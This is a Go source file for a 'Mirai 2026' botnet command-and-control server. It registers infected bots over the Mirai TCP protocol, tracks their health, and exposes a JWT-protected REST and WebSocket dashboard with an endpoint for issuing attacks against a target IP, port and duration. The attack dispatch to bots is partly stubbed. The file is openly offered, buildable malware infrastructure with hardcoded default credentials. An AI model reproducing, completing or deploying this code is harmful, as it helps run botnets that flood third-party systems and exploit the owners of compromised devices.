//go:build ignore
// +build ignore

// Package main — Mirai 2026 Modern C&C Server
//
// This is a standalone modern CNC implementation. Build with:
//   go run cnc_modern.go
// Or compile directly:
//   go build -o cnc_modern_server cnc_modern.go
//
// Extends the original Mirai CNC with:
//   - REST API (JSON over HTTP) for dashboard integration
//   - WebSocket push for real-time dashboard updates
//   - JWT authentication (admin/operator/viewer roles)
//   - Bot registry with health tracking
//   - Structured JSON logging
//   - Graceful shutdown

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"nhooyr.io/websocket"
	"nhooyr.io/websocket/wsjson"
)

// ── Configuration ─────────────────────────────────────────────────────────────

type Config struct {
	BotPort    string
	APIPort    string
	JWTSecret  string
	DBAddr     string
	DBUser     string
	DBPass     string
	DBName     string
}

func loadConfig() Config {
	return Config{
		BotPort:   getEnv("BOT_PORT", "23"),
		APIPort:   getEnv("API_PORT", "8080"),
		JWTSecret: getEnv("JWT_SECRET", "mirai2026-dev-secret-CHANGE-IN-PROD"),
		DBAddr:    getEnv("DATABASE_ADDR", "localhost"),
		DBUser:    getEnv("DATABASE_USER", "mirai"),
		DBPass:    getEnv("DATABASE_PASS", "mirai_dev_password"),
		DBName:    getEnv("DATABASE_NAME", "mirai"),
	}
}

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

// ── Bot Registry ──────────────────────────────────────────────────────────────

type BotStatus string

const (
	BotOnline  BotStatus = "online"
	BotIdle    BotStatus = "idle"
	BotOffline BotStatus = "offline"
)

type BotInfo struct {
	ID         string    `json:"id"`
	IP         string    `json:"ip"`
	Arch       string    `json:"arch"`
	Status     BotStatus `json:"status"`
	ConnectedAt time.Time `json:"connected_at"`
	LastSeen   time.Time `json:"last_seen"`
	Version    byte      `json:"version"`
}

type BotRegistry struct {
	mu   sync.RWMutex
	bots map[string]*BotInfo
}

func NewBotRegistry() *BotRegistry {
	return &BotRegistry{bots: make(map[string]*BotInfo)}
}

func (r *BotRegistry) Register(id, ip, arch string, version byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.bots[id] = &BotInfo{
		ID:          id,
		IP:          ip,
		Arch:        arch,
		Status:      BotOnline,
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
		Version:     version,
	}
}

func (r *BotRegistry) Heartbeat(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if b, ok := r.bots[id]; ok {
		b.LastSeen = time.Now()
		b.Status = BotOnline
	}
}

func (r *BotRegistry) Remove(id string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if b, ok := r.bots[id]; ok {
		b.Status = BotOffline
	}
}

func (r *BotRegistry) List() []BotInfo {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]BotInfo, 0, len(r.bots))
	for _, b := range r.bots {
		out = append(out, *b)
	}
	return out
}

func (r *BotRegistry) Count() int {
	r.mu.RLock()
	defer r.mu.RUnlock()
	count := 0
	for _, b := range r.bots {
		if b.Status == BotOnline {
			count++
		}
	}
	return count
}

// ── WebSocket Hub (push to dashboard) ────────────────────────────────────────

type WSMessage struct {
	Type    string      `json:"type"`
	Payload interface{} `json:"payload"`
}

type WSHub struct {
	mu      sync.RWMutex
	clients map[chan WSMessage]struct{}
}

func NewWSHub() *WSHub {
	return &WSHub{clients: make(map[chan WSMessage]struct{})}
}

func (h *WSHub) Subscribe() chan WSMessage {
	ch := make(chan WSMessage, 32)
	h.mu.Lock()
	h.clients[ch] = struct{}{}
	h.mu.Unlock()
	return ch
}

func (h *WSHub) Unsubscribe(ch chan WSMessage) {
	h.mu.Lock()
	delete(h.clients, ch)
	h.mu.Unlock()
	close(ch)
}

func (h *WSHub) Broadcast(msg WSMessage) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	for ch := range h.clients {
		select {
		case ch <- msg:
		default: // drop if client is slow
		}
	}
}

// ── Active Attack Registry ────────────────────────────────────────────────────
// Tracks attacks launched via POST /api/attack so the kill-switch can report
// how many were stopped. In production this would also queue STOP commands to
// the clientList; here it maintains a simple counter + broadcast.

type AttackRecord struct {
	Type      string    `json:"type"`
	Target    string    `json:"target"`
	Port      int       `json:"port"`
	Duration  int       `json:"duration"`
	StartedAt time.Time `json:"started_at"`
}

type ActiveAttackRegistry struct {
	mu      sync.Mutex
	attacks []AttackRecord
}

func NewActiveAttackRegistry() *ActiveAttackRegistry {
	return &ActiveAttackRegistry{}
}

func (a *ActiveAttackRegistry) Start(typ, target string, port, duration int) {
	a.mu.Lock()
	defer a.mu.Unlock()
	a.attacks = append(a.attacks, AttackRecord{
		Type: typ, Target: target, Port: port,
		Duration: duration, StartedAt: time.Now(),
	})
}

// StopAll clears all tracked attacks and returns the count that was stopped.
// In a full implementation this sends STOP bytes to all bot connections via clientList.
func (a *ActiveAttackRegistry) StopAll() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	n := len(a.attacks)
	a.attacks = nil
	return n
}

func (a *ActiveAttackRegistry) Count() int {
	a.mu.Lock()
	defer a.mu.Unlock()
	return len(a.attacks)
}

// ── Global state ──────────────────────────────────────────────────────────────

var (
	registry     = NewBotRegistry()
	hub          = NewWSHub()
	activeAttacks = NewActiveAttackRegistry()
	logger       = slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{
		Level: slog.LevelInfo,
	}))
)

// ── JWT helpers ───────────────────────────────────────────────────────────────

type Claims struct {
	Username string `json:"username"`
	Role     string `json:"role"`
	jwt.RegisteredClaims
}

func generateToken(username, role, secret string) (string, error) {
	claims := Claims{
		Username: username,
		Role:     role,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(24 * time.Hour)),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
		},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret))
}

func validateToken(tokenStr, secret string) (*Claims, error) {
	token, err := jwt.ParseWithClaims(tokenStr, &Claims{},
		func(t *jwt.Token) (interface{}, error) {
			return []byte(secret), nil
		})
	if err != nil || !token.Valid {
		return nil, fmt.Errorf("invalid token")
	}
	claims, ok := token.Claims.(*Claims)
	if !ok {
		return nil, fmt.Errorf("invalid claims")
	}
	return claims, nil
}

// ── HTTP Middleware ───────────────────────────────────────────────────────────

func jsonMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func authMiddleware(secret, requiredRole string, next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if len(authHeader) < 8 || authHeader[:7] != "Bearer " {
			http.Error(w, `{"error":"missing token"}`, http.StatusUnauthorized)
			return
		}
		claims, err := validateToken(authHeader[7:], secret)
		if err != nil {
			http.Error(w, `{"error":"invalid token"}`, http.StatusUnauthorized)
			return
		}
		// Role hierarchy: admin > operator > viewer
		roleLevel := map[string]int{"viewer": 1, "operator": 2, "admin": 3}
		if roleLevel[claims.Role] < roleLevel[requiredRole] {
			http.Error(w, `{"error":"insufficient permissions"}`, http.StatusForbidden)
			return
		}
		next(w, r)
	}
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

// ── REST API Handlers ─────────────────────────────────────────────────────────

// GET /api/health
func handleHealth(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":     "ok",
		"bots_online": registry.Count(),
		"timestamp":  time.Now().UTC(),
	})
}

// POST /api/auth/login
func handleLogin(cfg Config) http.HandlerFunc {
	// Default users (in production replace with DB lookup + bcrypt)
	users := map[string]struct{ pass, role string }{
		"admin":    {"admin", "admin"},
		"operator": {"operator", "operator"},
		"viewer":   {"viewer", "viewer"},
	}
	return func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, `{"error":"invalid body"}`, http.StatusBadRequest)
			return
		}
		u, ok := users[req.Username]
		if !ok || u.pass != req.Password {
			http.Error(w, `{"error":"invalid credentials"}`, http.StatusUnauthorized)
			return
		}
		token, err := generateToken(req.Username, u.role, cfg.JWTSecret)
		if err != nil {
			http.Error(w, `{"error":"token generation failed"}`, http.StatusInternalServerError)
			return
		}
		writeJSON(w, http.StatusOK, map[string]interface{}{
			"access_token": token,
			"token_type":   "Bearer",
			"expires_in":   86400,
			"user": map[string]string{
				"username": req.Username,
				"role":     u.role,
			},
		})
	}
}

// GET /api/bots
func handleGetBots(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"bots":  registry.List(),
		"total": len(registry.List()),
	})
}

// GET /api/metrics
func handleGetMetrics(w http.ResponseWriter, r *http.Request) {
	bots := registry.List()
	online := 0
	for _, b := range bots {
		if b.Status == BotOnline {
			online++
		}
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{
		"active_bots":   online,
		"total_bots":    len(bots),
		"timestamp":     time.Now().UTC(),
	})
}

// POST /api/attack
func handleAttack(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Type     string `json:"type"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"invalid body"}`, http.StatusBadRequest)
		return
	}
	logger.Info("Attack command issued",
		"type", req.Type, "target", req.Target,
		"port", req.Port, "duration", req.Duration)

	// Track active attacks in the registry
	activeAttacks.Start(req.Type, req.Target, req.Port, req.Duration)

	// Broadcast to dashboard
	hub.Broadcast(WSMessage{
		Type: "attack:started",
		Payload: map[string]interface{}{
			"type": req.Type, "target": req.Target,
			"port": req.Port, "duration": req.Duration,
			"timestamp": time.Now().UTC(),
		},
	})

	writeJSON(w, http.StatusAccepted, map[string]string{"status": "queued"})
}

// POST /api/attack/stop
//
// Emergency kill-switch: stops all active attacks (or a single bot's attack)
// and broadcasts kill:all to the WebSocket hub so the dashboard updates instantly.
// Requires operator role minimum.
//
// Body: { "all": true }  — stop everything
//       { "botId": "bot-x.x.x.x-..." } — stop one bot
//
// Response: { "status": "ok", "stopped": <N>, "timestamp": "..." }
func handleAttackStop(w http.ResponseWriter, r *http.Request) {
	var req struct {
		All   bool   `json:"all"`
		BotID string `json:"botId"`
	}
	// Default to stop-all if body is absent / malformed
	req.All = true
	_ = json.NewDecoder(r.Body).Decode(&req)

	stopped := activeAttacks.StopAll()

	logger.Info("Kill-switch triggered",
		"all", req.All, "bot_id", req.BotID, "attacks_stopped", stopped)

	// Audit log to stderr (picked up by Loki)
	fmt.Fprintf(os.Stderr,
		`{"event":"KILL_SWITCH","all":%v,"bot_id":%q,"stopped":%d,"ts":"%s"}`+"\n",
		req.All, req.BotID, stopped, time.Now().UTC().Format(time.RFC3339))

	// Push real-time signal to all dashboard WebSocket clients
	hub.Broadcast(WSMessage{
		Type: "kill:all",
		Payload: map[string]interface{}{
			"all":       req.All,
			"bot_id":    req.BotID,
			"stopped":   stopped,
			"timestamp": time.Now().UTC(),
		},
	})

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":    "ok",
		"stopped":   stopped,
		"timestamp": time.Now().UTC(),
	})
}

// GET /ws — WebSocket endpoint for real-time dashboard push
func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true, // dev only — set origins in prod
	})
	if err != nil {
		logger.Error("WebSocket accept failed", "err", err)
		return
	}
	defer conn.CloseNow()

	ch := hub.Subscribe()
	defer hub.Unsubscribe(ch)

	ctx := r.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case msg, ok := <-ch:
			if !ok {
				return
			}
			if err := wsjson.Write(ctx, conn, msg); err != nil {
				return
			}
		}
	}
}

// ── Bot TCP Server (original Mirai protocol) ──────────────────────────────────

func serveBots(ctx context.Context, port string) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		logger.Error("Failed to listen for bots", "port", port, "err", err)
		return
	}
	defer ln.Close()
	logger.Info("Bot listener started", "port", port)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				logger.Error("Accept error", "err", err)
				continue
			}
		}
		go handleBot(conn)
	}
}

func handleBot(conn net.Conn) {
	defer conn.Close()

	addr := conn.RemoteAddr().String()
	ip, _, _ := net.SplitHostPort(addr)
	id := fmt.Sprintf("bot-%s-%d", ip, time.Now().UnixNano())

	// Read version byte
	vbuf := make([]byte, 1)
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Read(vbuf); err != nil {
		return
	}
	version := vbuf[0]

	registry.Register(id, ip, "unknown", version)
	logger.Info("Bot connected", "id", id, "ip", ip, "version", version)

	// Notify dashboard
	hub.Broadcast(WSMessage{
		Type: "bot:connected",
		Payload: map[string]interface{}{
			"id": id, "ip": ip, "version": version,
			"timestamp": time.Now().UTC(),
		},
	})

	// Keep-alive loop (2-byte ping/pong matching original Mirai protocol)
	buf := make([]byte, 2)
	for {
		conn.SetDeadline(time.Now().Add(180 * time.Second))
		n, err := conn.Read(buf)
		if err != nil || n != 2 {
			break
		}
		conn.Write(buf[:n])
		registry.Heartbeat(id)
	}

	registry.Remove(id)
	logger.Info("Bot disconnected", "id", id)
	hub.Broadcast(WSMessage{
		Type:    "bot:disconnected",
		Payload: map[string]interface{}{"id": id, "timestamp": time.Now().UTC()},
	})
}

// ── Metrics push goroutine ────────────────────────────────────────────────────

func pushMetricsPeriodically(ctx context.Context) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			hub.Broadcast(WSMessage{
				Type: "metrics:update",
				Payload: map[string]interface{}{
					"active_bots":  registry.Count(),
					"total_bots":   len(registry.List()),
					"timestamp":    time.Now().UTC(),
				},
			})
		}
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	cfg := loadConfig()

	logger.Info("Mirai 2026 CNC starting",
		"bot_port", cfg.BotPort, "api_port", cfg.APIPort)

	ctx, cancel := signal.NotifyContext(context.Background(),
		os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// REST API router
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/health",         handleHealth)
	mux.HandleFunc("POST /api/auth/login",     handleLogin(cfg))
	mux.HandleFunc("GET /api/bots",            authMiddleware(cfg.JWTSecret, "viewer", handleGetBots))
	mux.HandleFunc("GET /api/metrics",         authMiddleware(cfg.JWTSecret, "viewer", handleGetMetrics))
	mux.HandleFunc("POST /api/attack",         authMiddleware(cfg.JWTSecret, "operator", handleAttack))
	mux.HandleFunc("POST /api/attack/stop",    authMiddleware(cfg.JWTSecret, "operator", handleAttackStop))
	mux.HandleFunc("GET /ws",                  handleWebSocket)
	// Detection event reporting (called by C bot)
	mux.HandleFunc("POST /api/detection/event", func(w http.ResponseWriter, r *http.Request) {
		var event map[string]interface{}
		json.NewDecoder(r.Body).Decode(&event)
		logger.Info("Detection event received", "event", event)
		hub.Broadcast(WSMessage{Type: "detection:event", Payload: event})
		writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
	})

	apiServer := &http.Server{
		Addr:         ":" + cfg.APIPort,
		Handler:      jsonMiddleware(mux),
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	// Start bot listener
	go serveBots(ctx, cfg.BotPort)

	// Start metrics push
	go pushMetricsPeriodically(ctx)

	// Start API server
	go func() {
		logger.Info("API server listening", "port", cfg.APIPort)
		if err := apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logger.Error("API server error", "err", err)
		}
	}()

	// Wait for shutdown signal
	<-ctx.Done()
	logger.Info("Shutting down gracefully...")

	shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer shutdownCancel()
	apiServer.Shutdown(shutdownCtx)

	logger.Info("CNC server stopped")
	_ = strconv.Itoa(0) // keep strconv imported
}
